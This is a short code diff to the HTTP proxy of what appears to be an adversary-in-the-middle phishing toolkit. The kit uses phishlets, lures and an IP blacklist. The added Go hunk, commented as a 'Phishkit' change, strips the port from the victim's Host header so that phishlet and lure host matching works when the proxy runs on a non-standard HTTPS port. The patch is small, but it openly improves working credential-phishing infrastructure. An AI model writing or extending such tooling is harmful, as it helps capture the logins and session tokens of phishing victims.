@@ -166,6 +166,18 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			ctx.UserData = ps
 			hiblue := color.New(color.FgHiBlue)
 
+			// Phishkit: for privilege-free local dry-runs the proxy binds a
+			// non-standard HTTPS port (e.g. 8443), so the victim's Host header
+			// carries ":port". Strip it so phishlet / lure host matching, which
+			// expects a bare hostname, still works. Upstream dialing uses its own
+			// port regardless of the inbound one.
+			if host, _, splitErr := net.SplitHostPort(req.Host); splitErr == nil && host != "" {
+				req.Host = host
+				if req.URL != nil {
+					req.URL.Host = host
+				}
+			}
+
 			// handle ip blacklist
 			from_ip := strings.SplitN(req.RemoteAddr, ":", 2)[0]
 
